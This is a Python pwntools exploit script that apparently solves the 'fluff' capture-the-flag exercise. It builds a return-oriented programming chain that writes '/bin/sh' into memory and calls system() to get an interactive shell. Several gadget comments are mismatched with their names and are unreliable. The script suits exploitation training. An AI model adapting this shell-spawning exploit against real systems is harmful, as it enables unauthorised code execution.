#!/usr/bin/env python

from pwn import *

p = process("./fluff")
#p = remote("127.0.0.1", 6666)
context.arch = 'amd64'
p.recvuntil('>')


# Useful address
system_plt = p64(0x4005e0);
bss_section = p64(0x00601060);

# Gadgets
pop_rdi = p64(0x004008c3);
xor_r11_r11 = p64(0x400822) # pop r14; mov edi,junk; ret
xor_r11_r12 = p64(0x0040082f) # pop r12; mov r13d,junk; ret
pop_r12 = p64(0x00400853) # xor b[r10],r12b; ret
xchg_r11_r10 = p64(0x00400840) # pop r15; mov r11d,junk; ret
mov_qlr10_r11 = p64(0x0040084e) # pop r13; pop r12; xor b[r10]
#,r12b; ret


buf = "A"*40
# Stage 1: write bss_section into r10
buf += xor_r11_r11
buf += p64(0)  # get rid of pop r14
buf += pop_r12
buf += bss_section
buf += xor_r11_r12
buf += p64(0) # get rid of pop r12
buf += xchg_r11_r10
buf += p64(0) # get rid of pop r15
# Stage 2: write '/bin/sh\x00' into bss_section
buf += xor_r11_r11
buf += p64(0)
buf += pop_r12
buf += "/bin/sh\x00"
buf += xor_r11_r12
buf += p64(0)
buf += mov_qlr10_r11
buf += p64(0)
buf += p64(0)
# Stage 3: Invoke System call
buf += pop_rdi
buf += bss_section
buf += system_plt
buf += p64(0x0000000000400746)

log.info("Sending buffer length: %d" % len(buf))

p.sendline(buf)
p.interactive()
